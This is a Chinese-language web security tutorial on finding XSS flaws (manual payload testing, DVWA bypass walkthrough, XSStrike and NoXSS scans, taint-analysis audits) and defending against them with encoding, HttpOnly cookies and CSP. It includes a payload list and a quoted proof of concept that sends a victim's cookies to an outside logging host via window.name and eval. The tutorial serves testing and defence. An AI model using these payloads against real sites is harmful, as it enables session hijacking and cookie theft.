---
title: XSS 的检测与防御
description: XSS 漏洞的检测方法（手工验证与自动化工具）与分层防御方案（输入过滤、输出编码、CSP、HttpOnly）
keywords: ['XSS防御', '输出编码', 'CSP', 'HttpOnly', 'XSS检测']
category: 安全
tags: ['Web安全', 'XSS', '防御']
---

# XSS 的检测与防御

前文介绍了反射型、存储型、DOM 型 XSS 的原理与常见攻击手法。本节介绍如何挖掘 XSS 漏洞，以及如何防御。

目前 Flash 已被各大浏览器禁用，Adobe 官方也不再更新 Flash 相关产品，HTML5 技术已基本替换掉 Flash，因此不再介绍 Flash 相关漏洞。

## XSS 漏洞挖掘

XSS 漏洞挖掘的方法可以按有无源码的情况分为黑盒测试和白盒测试。

**黑盒测试**主要是通过发送特意构造攻击字符串来验证漏洞，比如 `<script>alert(1)</script>`。请求后看是否会弹框，若会则代表存在 XSS，反之则不存在。

**白盒测试**是通过分析源代码来检测 XSS 漏洞，根据不同的编程语言采取不同的词法、语法分析方式，然后通过污点分析（追踪用户的输入数据是否达到特定的漏洞触发函数）的思路来检测漏洞。

来具体了解一下这两种方法。

### 黑盒测试

对于测试人员，多数情况下是没有目标网站的源码，对这种无源码的网站测试，称为黑盒测试。下面会从人工测试和工具自动测试两方面来讲解一些常用的黑盒测试技术。

#### 人工测试

人工测试的主要思路就是在一切可输入数据的地方输入“XSS payload”（测试用例），这些地方包括所有的 GET、POST、Cookie、HTTP 头。提交数据之后，看网站的输出是否解析了前面输入的 XSS payload。

常用的 XSS payload 有以下几个。搜索“XSS cheat sheet”，也可以找到很多这种测试用例。

- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

- [HTML5 Security Cheatsheet](http://html5sec.org/)

平时测试时，喜欢先将上面的 XSS payload 整理放在一个 txt 文件中，然后用数字区分每个用例，比如：

```html
<XSS id=x tabindex=1 onactivate=alert(1)></XSS>
<body onafterprint=alert(2)>
<XSS onafterscriptexecute=alert(3)><script>1</script>
<body onbeforeprint=alert(4)>
<svg><animate onbegin=alert(5) attributeName=x dur=1s>
……
```

然后将其一次性全复制进输入框中测试，看提交后有没有弹框，若弹框了，通过对应数字就能知道是哪个测试用例被成功执行了。有时输入长度有限制，就只能一个个测试，然后根据响应内容做一些调整。

上面这种测试方法相对暴力一些，有时网站有自己的一些数据处理逻辑（过滤、编码、输入类型判断等等），这时就需要一些探测性的输入，比如输入以下字符串：

```text
"'<script>;&#,/=(12345)
```

在返回页面的源码中搜索 12345 的输出位置，以及上面这些特殊字符的过滤情况。

以 DVWA 靶场中的 XSS（Reflected）题目为例，将 DVWA Security 中的安全等级设为 High。

先在题目中输入前面那串测试字符串去探测下：

在网页中右击菜单，选择“检查”查看源码，直接搜索“12345”，可以看到数据的输出位置。

可以发现，输出位置在`<pre>`标签内，并且过滤掉了“<script”（不包括引号）。尝试输入以下字符串看是否会有转机：

```text
"'<scr<scriptipt>;&#,/=(12345)
```

结果发现还是没用。

既然没法用`<script>`标签，就换个其他的标签试下。如果你不熟悉测试用例，可以回头翻看下前面介绍的 XSS cheat sheet。这里改用了`<img>`标签（下面的数字一样都是为了方便搜索源码）：

```html
<img>12345
```

可以看到，`<img>`被解析了。前面已经测试过，各种特殊字符也没过滤。这样就可以构造完整的测试用例试下：

```html
<img src=a onerror=alert(1)>
```

成功弹出提示框，返回页面中输入数据被完整地解析执行。

这里总结一下人工测试思路：日常收集一些 XSS cheat sheet，然后编号整理出来，用于日常测试用例；你可以先一次性批量输入测试，如果无效，再输入一些特殊字符看过滤情况，根据返回数据作相应的调整测试。

除了一些比较深的操作入口，并且涉及一些前置的操作条件（比如验证码、开启特定设置之类的），不然多数情况下，整个过程其实可以通过自动化工具实现。

#### 工具自动化测试

在《01-常用渗透测试工具》一节中介绍了一些常用的渗透测试工具，里面有支持 XSS 扫描的工具，比如 AWVS、Xray、Goby 这类综合型扫描器。

这里推荐一款专门针对 XSS 漏洞扫描的开源工具，[XSStrike](https://github.com/s0md3v/XSStrike)，它在业内也是有一定名气的。由于开源，非常有利于自己添加 XSS payload，或者做二次开发。

XSStrike 支持很多功能，比如 DOM XSS 扫描（基于正则扫描敏感函数，存在一定误报）、WAF 检测与绕过、爬虫、HTML/JS 动态解析引擎验证。常用的测试命令如下：

```text
爬虫整个网站进行 XSS 扫描：
python3 XSStrike.py -u "http://testphp.vulnweb.com/" --crawl
针对单个 URL 进行扫描：
python3 XSStrike.py -u "http://localhost/vulnerabilities/XSS_r/?name=a"
```

以 Acunetix 官方提供的在线测试站 testphp.vulnweb.com 为例，它可以检测搜索框存在的 XSS 漏洞，XSStrike 功能比较全面，但也会存在误报，而且告警结果展示的体验不是很好。

因此，这里再推荐另一款工具，叫 [NoXSS](https://github.com/lwzSoviet/NoXss)。它的特点就是批量扫描速度快，而且告警展示效果比 XSStrike 好，但漏洞检测能力不如 XSStrike，你可以把这两款搭配着使用。NoXSS 的使用方法也很简单，常用命令如下：

```shell
python start.py --url="http://localhost/vulnerabilities/XSS_r/?name=a"
```

DOM XSS 的扫描相比常规 XSS 要难一些，主要是针对 JS 代码的分析，如果只是简单的正则匹配，就很容易误报漏报。所以针对 DOM XSS 的检测，除了常规的 XSS payload 暴力测试、正则匹配检测代码外，还可以基于以下几种常见方法来检测 XSS。

- Headless Chrome：利用无界面 Chrome 浏览器来检测 XSS，参考「[基于 Chrome-headless 的 XSS 检测](https://paper.seebug.org/641/)」，这是目前主流的动态检测方法。

- QtWebKit：参考「[基于 QtWebKit 的 DOM XSS 检测技术](https://security.tencent.com/index.php/blog/msg/12)」，QtWebKit 作者已停止维护。

- PhantomJS：已停止维护。它提供一套基于 WebKit 的服务器端 JavaScript API，可以在无浏览器支持的情况下实现 Web 浏览器功能的支持，例如 DOM 处理、JavaScript、CSS 选择器、JSON、Canvas 和可缩放矢量图形 SVG 等功能。

这些方法可以实现动态解析 JS，以验证特意构造的 XSS payload 是否被执行，从而准确地判断是否存在 XSS 漏洞。

这种动态检测 DOM XSS 的工具，个人特别推荐 Dominator。它是基于 Firefox 改造的，在一些关键的输入输出函数添加 Hook，如果发现有用户可控数据输出到一些 sink 漏洞触发函数上就会告警。它的特点是发现率高，虽然也有不少误报。此前用它发现了不少国内知名网站的 DOM XSS，有些不同域名的网站引用到同一个漏洞 JS 文件，导致一个漏洞影响一大批网站。

以之前一些 Yahoo DOM XSS 为例，当你用 Dominator 访问了存在漏洞的页面后，可以看到其输出的告警内容如下：

提示 window.name 输入数据被直接传递给 eval 函数，也就是说如果你能控制 window.name 的值，就可以实现任意 JS 代码的执行。利用起来也非常简单，可以看下漏洞发现者 Abysssec 公司发布的利用代码：

```html
<html>
<script>
window.name=' new Image().src="http://abysssec.com/log/log.php?cookie="+encodeURI(document.cookie);
setTimeout(\"location.href = \'http:\/\/www.yahoo.com\';\",10);';
location.href="http://adspecs.yahoo.com/index.php";
</script>
</html>
```

利用思路就是直接设置 window.name 参数，插入打算执行的 JS 代码，然后用 location.href 跳转到漏洞页面去触发。这类漏洞在网易的一些网站上也发现了不少，也是用 Dominator 挖掘到的，所以个人比较推荐。

### 白盒测试

如果有网站源码，就可以直接通过分析源码来挖掘漏洞。网站开发语言非常多， JavaScript、PHP、Python、Go、C/C++等等都可以用来开发网站的前端和后端。不同的语言有不同的特性，在源码审计时需要采取不同的检测点，但有一个共同的思路，那就是**污点分析的检测思路**。

前面已经简单地提到污点分析原理就是检测用户可控的输入数据，污点也就是用户可控的输入数据。然后去追踪污点的传播过程，检测是否传递给危险的输出函数。对于 XSS 就是能够控制页面内容或者执行 JS 的输出函数有 echo、eval等。

有时也会反着来：先查看一些危险的输出函数，再回溯它的参数传递，判断是否有未经过滤的用户输入数据，若有就代表可能存在漏洞。其他漏洞类型，以及其他编程语言的代码审计方式都是相通的，只是有不同的 sinks 和过滤函数需要作为检测点。

以 PHP 源码审计为例，常见的污点 source 有 `$_GET`、`$_POST`、`$_REQUEST`、`$_COOKIE`、`$_SERVER`、`$_FILES`、`php://input` 等外部输入。

XSS 常见的污点触发位置 sink 则有 `echo`、`print`、`printf`、`print_r`、`var_dump`、`die`、`exit` 等输出类函数。

在审计代码时，习惯使用 VSCode 和 Sublime，你可以根据自己的喜好选择一款合适的代码阅读软件，然后批量搜索文件中的 sink 位置，再往上回溯追踪是否有引入 source 污染数据；若引入了，有没有做好过滤转义等安全工作。

关于 DOM XSS 的审计，主要是针对 JS 代码的审计，它的 sources & sinks 已在《04-XSS 跨站脚本攻击》中介绍过（如 innerHTML、eval、document.write 等危险 sink），此处不再赘述；你也可以按照污点分析的思路去做 JS 代码审计。

主流的自动化源码审计工具有 RIPS、Coverity、CheckMarx 等等，都是一些商业软件。近两年也有一些优秀的开源项目贡献，比如 [Kunlun-M](https://github.com/LoRexxar/Kunlun-M)，目前作者仍在更新维护中。如果你或者你所在的公司没有条件采购商业软件，这也是一个不错的选择。

## 防御 XSS 攻击

以前在面试一些同学时，问他们怎么修复 XSS，都会说做好过滤，但具体怎么做过滤，很多都答不上来。有的会简单说下做 HTML 实体化编码，比如用 htmlspecialchars 函数，但只做这一种处理其实是错误的。XSS 的防御必须根据不同的触发位置采取不同的防御方案，下面来详细了解一下。

### 输入检查

在测试 XSS 时，经常需要输入一些特殊字符，所以在一开始直接做好输入检查有利于减少攻击的可能性。在协助业务修复漏洞的时候，经常推荐的方法就是白名单限制，比如参数是个整数值，那直接限制死即可，若不符合就抛异常。不要单纯只想着过滤替换特殊字符，这很容易就被绕过了。

如果白名单范围不好确定，就会采用黑名单的方式，把常用的 XSS payload 特殊字符或字符串做检测，比如`<script>`、javascript:、<、>、'、"、&、#。但是黑名单这种方式，有时结合业务场景，以及浏览器特性，就有可能找到绕过方法。

还有一定不要单纯只在客户端上做过滤，还要结合服务端做限制。若只是客户端上做过滤，那么抓包后修改数据重发就绕过了。

### 输出检查

跨站漏洞的触发关键点就在于输出的位置，所以对输出进行检查尤为重要。

以前百度 Hi 空间有个 XSS 漏洞，官方后来虽然修复了， 但发现者的百度 Hi 空间仍存在 XSS 弹框。这正是因为官方的修复方案中只做了输入检查，没有过输出检查，导致以前曾被利用过的 XSS payload 仍然有效。如果在官方修复前，那个 XSS 漏洞已经被恶意利用了，那即使已经通过输入检查方法修复了，被插入的恶意代码仍会存在，这可以认为是修复不彻底的表现。

有时网站需要支持富文本（用户自定义的 HTML 代码），比如为方便用户而保留的`<a>`链接标签，此时采用白名单的方式，直接限制允许输入的标签、字符是最佳方案。

那应该如何根据不同的位置采取不同的 XSS 防御方案呢？核心原则是按输出上下文选择对应的编码方式：输出到 HTML 正文/属性时做 HTML 实体编码（如 PHP 的 htmlspecialchars）；输出到 JS 代码中时按 JS 字符串规则安全编码（如 JSON 序列化）；输出到 URL 时做协议白名单校验并 URL 编码。具体可参考 [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)。由于 DOM XSS 情况特殊，下面单独用一个小节来介绍。

### 防御 DOM XSS

DOM XSS 是一种特殊的 XSS 类型，前面介绍的一些防御方法并不那么通用，需要根据输出位置做不同的防御方法。基本原则是：避免将不可信数据通过 `innerHTML`、`document.write`、`eval` 等危险 sink 写入页面，改用 `textContent`、`createElement` 等 DOM API；URL 类属性（如 href/src）要校验协议白名单，防止 `javascript:` 伪协议注入。可参考 [OWASP DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)。

### HttpOnly Cookie

如果你在 Cookie 中设置了 HttpOnly 属性，那 JavaScript 脚本将无法读取到 Cookie，这样就能防止通过 XSS 窃取 Cookie，在一定程度上能够减少 XSS 的攻击范围。

用 EditThisCookie 插件看下招聘网站网的 Cookie，可以发现其中 JSESSIONID 就开启 HttpOnly。

在 PHP 中，可以使用 setcookie 或 setrawcookie 的第 7 个参数来开启，将其设置为 TRUE 即可 HttpOnly：

```php
setcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);
setrawcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);
```

### Content Security Policy

内容安全策略（Content Security Policy，CSP）也是减少 XSS 攻击的一种方式，是浏览器提供一种防御机制。它采用的是白名单机制，告诉浏览器可以加载和执行哪些外部资源，这样就能防止被一些第三方恶意脚本注入执行。

开启 CSP 有两种方式：

（1）通过 HTTP 头信息的 Content-Security-Policy 的字段：

```http
Content-Security-Policy: script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:
```

（2）通过网页的`<meta>`标签设置：

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">
```

这里对一些常用指令做个解释：

| 指令 | 作用 |
|------|------|
| default-src | 各类资源的默认加载策略，未单独指定某类指令时生效 |
| script-src | 限制 JavaScript 的加载与执行来源 |
| style-src | 限制样式表的加载来源 |
| img-src | 限制图片的加载来源 |
| connect-src | 限制 XHR、fetch、WebSocket 等连接目标 |
| font-src | 限制字体的加载来源 |
| object-src | 限制 `<object>`/`<embed>` 等插件资源，常设为 'none' |
| frame-src | 限制内嵌框架的加载来源 |
| media-src | 限制音视频资源的加载来源 |

指令值中，`'self'` 表示仅允许同源资源，`'none'` 表示禁止加载该类资源，也可以指定具体的域名或协议来源。

之前有次测试，发现了一个 XSS 漏洞，但死活利用不成功，搞半天一直没找到原因，后来发现正是 CSP 限制了 JS 资源的加载执行。

平时测试时可以使用 Google 提供的 [CSP Evaluator](https://csp-evaluator.withgoogle.com/) 检查网站的 CSP 设置是否存在缺陷。

在实际测试 XSS 时，有时也需要注意下 CSP 情况，避免折腾半天也没找到 XSS 利用失败的原因。现在 Google 内部一直在大力推行 CSP，这确实是一种防御 XSS 攻击的有效办法。

